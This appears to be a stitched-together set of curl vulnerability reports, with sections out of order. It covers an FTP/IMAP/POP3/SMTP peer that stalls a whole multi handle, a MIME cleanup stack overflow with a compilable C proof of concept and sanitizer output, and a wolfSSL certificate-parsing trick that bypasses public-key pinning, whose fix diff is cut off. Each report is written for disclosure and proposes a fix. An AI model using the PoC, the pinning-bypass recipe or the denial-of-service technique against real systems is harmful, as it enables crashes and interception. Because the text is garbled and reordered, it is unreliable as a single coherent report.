Measured results (audit revision, `CURLOPT_TIMEOUT_MS=5000`, 90-second flood window):

```
exploit: RESULT configured_timeout_ms=5000 a_done_at_ms=90005.0 a_result=28(Timeout was reached) b_done_at_ms=90005.0 elapsed_ms=90005.0
control: RESULT configured_timeout_ms=5000 a_done_at_ms=5002.0  a_result=28(Timeout was reached) b_done_at_ms=306.1 elapsed_ms=5002.0
```

In `control` mode, where the peer sends one real final line immediately, the 5000ms deadline fires exactly on schedule (`a_done_at_ms=5002.0`), and B (already answered by roughly 300ms) completes promptly right after (`b_done_at_ms=306.1`).

In `exploit` mode, the same deadline isn't enforced at all: A only finishes when the 90-second flood itself stops (`a_done_at_ms=90005.0`, 18x past its configured deadline). B, whose server had already written its response by roughly 300ms in, isn't serviced either until that same instant, 89.7 seconds after it was ready. One malicious peer, by never sending a final line, held the entire multi handle's dispatch loop hostage for the whole flood duration.

## Suggested direction

Bound the work done per `Curl_pp_readresp()` invocation: limit the reads, bytes, or lines consumed per call, and return to the caller regardless of whether the buffer keeps filling. Also call `Curl_pgrsCheck()` and consult `Curl_pp_state_timeleft_ms()` inside the repeated-read loop itself, not only in `Curl_pp_statemach()` before the loop is entered, so an always-readable peer can't prevent the configured response and overall deadlines from ever being checked, for itself and for every other transfer sharing the multi handle.

Cheers,
Josh

## Impact

This gives any contacted FTP/IMAP/POP3/SMTP server a process-level denial-of-service primitive against applications that share one multi handle (or one thread driving it) across transfers to different destinations. A single malicious server the application merely asked a question of can freeze every other in-flight transfer on that event loop, indefinitely, regardless of what timeout those other transfers were configured with.

Preconditions:
- An application using FTP, IMAP, POP3, or SMTP alongside other transfers on the same multi handle
- `CURLOPT_TIMEOUT_MS`/`--max-time` configured on the targeted transfer (the counter-measure curl's own security policy expects the caller to have)
- A server willing to keep the control connection readable without ever sending a final response line

Hi all,

I've discovered a stack overflow in libcurl's MIME cleanup code. The read path in the MIME implementation is protected by a recursion depth limit (`MAX_MIME_LEVELS = 40`, defined at line 47 of `lib/mime.c` and checked in `read_part_content` and related functions), but the cleanup path has no equivalent guard. A deeply nested multipart structure built through the public API will crash the process when freed.

## Impact

Any application using the libcurl MIME API (`curl_mime_addpart` / `curl_mime_subparts`) to process user-controlled MIME structure depth is at risk. The crash happens inside `curl_mime_free` as part of normal cleanup, so once the structure is built, there is no way to avoid it. In a server-side context where an application constructs a MIME request based on external input, an attacker can cause reliable process termination by supplying input that drives the nesting depth high enough. This does not appear to be exploitable for code execution.

## Root cause

The cleanup functions form a mutual recursion with no depth limit. When a `curl_mimepart` holds subparts (set via `curl_mime_subparts`), the part's `freefunc` is set to `mime_subparts_free`. During `curl_mime_free`, the call chain is:

`curl_mime_free` -> `Curl_mime_cleanpart` -> `cleanup_part_content` -> `part->freefunc()` (i.e., `mime_subparts_free`) -> `curl_mime_free` -> ...

The relevant code in `lib/mime.c`:

```c
/* line 1056 */
static void cleanup_part_content(curl_mimepart *part)
{
  if(part->freefunc)
    part->freefunc(part->arg);   /* calls mime_subparts_free for multipart parts */
  ...
}

/* line 1075 */
static void mime_subparts_free(void *ptr)
{
  curl_mime *mime = (curl_mime *)ptr;

  if(mime && mime->parent) {
    mime->parent->freefunc = NULL;
    cleanup_part_content(mime->parent);
  }
  curl_mime_free(mime);          /* recurses back into curl_mime_free */
}

/* line 1113 */
void curl_mime_free(curl_mime *mime)
{
  curl_mimepart *part;

  if(mime) {
    mime_subparts_unbind(mime);
    while(mime->firstpart) {
      part = mime->firstpart;
      mime->firstpart = part->nextpart;
      Curl_mime_cleanpart(part);   /* calls cleanup_part_content */
      curlx_free(part);
    }
    curlx_free(mime);
  }
}
```

Each nesting level adds roughly four stack frames. At 5000 levels the stack overflows (just an example number here, obvious dependent on system, memory, the orientation of the moon, etc). The same problem exists in `multipart_size` (line 1570) and `Curl_mime_prepare_headers` (line 1761), both of which recurse into child parts with no depth check. `Curl_mime_prepare_headers` at line 1860 does it here:

```c
  for(subpart = mime->firstpart; subpart; subpart = subpart->nextpart) {
    result = Curl_mime_prepare_headers(data, subpart, NULL,
                                       disposition, strategy);
    if(result)
      return result;
  }
```

Compare this to how `read_part_content` handles it at line 703:

```c
static size_t read_part_content(curl_mimepart *part, char *buffer,
                                size_t bufsize, bool *hasread,
                                size_t call_depth)
{
  if(++call_depth > MAX_MIME_LEVELS)
    return READ_ERROR;
  ...
```

The read path threads `call_depth` through every call and returns an error at 40 levels. The cleanup and sizing paths do neither.

There is also no depth check at construction time. `curl_mime_addpart` and `curl_mime_subparts` accept arbitrarily deep nesting without complaint, so curl's cleanup code is responsible for handling whatever structure the caller provides.

## PoC

```c
#include <curl/curl.h>
#include <stdio.h>

int main(void)
{
  CURL *easy;
  curl_mime *root;
  curl_mime *current;
  int i;

  curl_global_init(CURL_GLOBAL_ALL);
  easy = curl_easy_init();
  root = curl_mime_init(easy);
  current = root;
  if(!easy || !root)
    return 1;

  for(i = 0; i < 5000; i++) {
    curl_mimepart *part = curl_mime_addpart(current);
    curl_mime *child = curl_mime_init(easy);
    if(!part || !child)
      return 1;
    curl_mime_subparts(part, child);
    current = child;
  }
  printf("freeing 5000 nested MIME levels\n");
  fflush(stdout);
  curl_mime_free(root);
  curl_easy_cleanup(easy);
  curl_global_cleanup();
  return 0;
}
```

running:

```text
freeing 5000 nested MIME levels
AddressSanitizer:DEADLYSIGNAL
=================================================================
==83118==ERROR: AddressSanitizer: stack-overflow on address 0x00016c63ffb8 (pc 0x0001032bf7a0 bp 0x00016c6400a0 sp 0x00016c63fd20 T0)
    #0 0x0001032bf7a0 in cleanup_part_content mime.c:1061
    #1 0x0001032c7a6c in mime_subparts_free mime.c:1081
    #2 0x0001032bf794 in cleanup_part_content mime.c:1059
    #3 0x0001032bed6c in Curl_mime_cleanpart mime.c:1101
    #4 0x0001032c0534 in curl_mime_free mime.c:1122
    #5 0x0001032c7a78 in mime_subparts_free mime.c:1083
    #6 0x0001032bf794 in cleanup_part_content mime.c:1059
    #7 0x0001032bed6c in Curl_mime_cleanpart mime.c:1101
    #8 0x0001032c0534 in curl_mime_free mime.c:1122
.....
```

## Fix direction

The most direct fix is to thread a depth counter through `curl_mime_free`, `Curl_mime_cleanpart`, `cleanup_part_content`, and `mime_subparts_free`, following the same pattern already used in `read_part_content`. The same treatment is needed for `multipart_size` and `Curl_mime_prepare_headers`. An iterative rewrite of any of these functions would be more robust than a depth cap, too.

## Impact

Stack overflow

Cheers,
Josh

## Summary:
With the wolfSSL backend, `--pinnedpubkey` is checked against a public key that curl extracts by re-parsing the server certificate with its own ASN.1 parser (lib/vtls/x509asn1.c), while wolfSSL verifies the chain with its own parser. curl 8.23.0 added a check that the `validity` field of the TBSCertificate is fully consumed by its two dates, but the two fields parsed right before it get no such check: the optional `version [0]` element and the `signature` AlgorithmIdentifier, whose return value is not even NULL-checked. A CA-signed certificate whose `version [0]` or `signature` element declares a length that swallows the real issuer, validity, subject and public key A, with a tail carrying a second issuer, validity, subject and public key B inside a BIT STRING that wolfSSL skips, is chain-verified by wolfSSL 5.9.2 with key A while curl pins key B.

This breaks pinnedpubkey.md (https://curl.se/docs/manpage.html#--pinnedpubkey, source https://github.com/curl/curl/blob/curl-8_23_0/docs/cmdline-opts/pinnedpubkey.md):

> A public key is extracted from this certificate and if it does not exactly match the public key provided to this option, curl aborts the connection before sending or receiving any data.

Precondition: wolfSSL 5.9.2 or older (5.9.4 rejects the certificate itself), the same precondition as the related advisory published with 8.23.0. lib/vtls/schannel.c lines 1140 to 1160 use the same parser for pinning and are likely affected on Windows; not tested here. mbedTLS, GnuTLS and OpenSSL take the key from the TLS library and are not affected.


## Affected version
curl 8.23.0 and master 7d091c71fd built with wolfSSL 5.9.2, macOS. The master change for indefinite-length elements does not cover this.

## Steps To Reproduce:
1. Build a certificate signed by a test CA with real fields and key A, where the `signature` SEQUENCE (or `version [0]`) declares an oversized length, and append a fake issuer, validity, subject and public key B inside an `issuerUniqueID` BIT STRING. Serve it on 127.0.0.1:37000 with key A only. Pin B is the hash of a key that exists only in the test directory.

2. Run:

```
curl --cacert ca.pem --pinnedpubkey "sha256//<pin B>" https://127.0.0.1:37000/
```

3. Result on 8.23.0 built with wolfSSL 5.9.2:

```
pin B:  exit=0  http=200   public key hash matches pinned value
pin A:  exit=90 http=000   public key does not match pinned public key
server log: REQUEST GET / Host=127.0.0.1:37000 TLS=304
```

Control certificate (well-formed, key A): pin A exit 0, pin B exit 90. The certificate layout fixed in 8.23.0 is refused by this build (parse error, exit 35), so this is a different, unfixed path. Same certificate on wolfSSL 5.9.4, OpenSSL, mbedTLS, Apple: rejected by the TLS library (exit 35); GnuTLS pins its own key A and refuses pin B (exit 90). The generator script, server and run.sh are attached.

Root cause, lib/vtls/x509asn1.c `Curl_parseX509()`:

```c
  if(elem.tag == 0) {
    if(!getASN1Element(&cert->version, elem.beg, elem.end))
      return -1;
    beg = getASN1Element(&elem, beg, end);
    ...
  }
  cert->serialNumber = elem;
  /* Get signature algorithm. */
  beg = getASN1Element(&cert->signatureAlgorithm, beg, end);
  /* Get issuer. */
  beg = getASN1Element(&cert->issuer, beg, end);
```

Proposed fix (verified against wolfSSL 5.9.2: both crafted certificates refused, control still pins correctly, revert brings the bypass back):

```diff
--- a/lib/vtls/x509asn1.c
+++ b/lib/vtls/x509asn1.c
@@ -816,14 +816,28 @@ int Curl_parseX509(struct Curl_X509certificate *cert,
   if(elem.tag == 0) {
     if(!getASN1Element(&cert->version, elem.beg, elem.end))
       return -1;
+    if(cert->version.end != elem.end)
+      return -1;
     beg = getASN1Element(&elem, beg, end);
     if(!beg)
       return -1;
   }
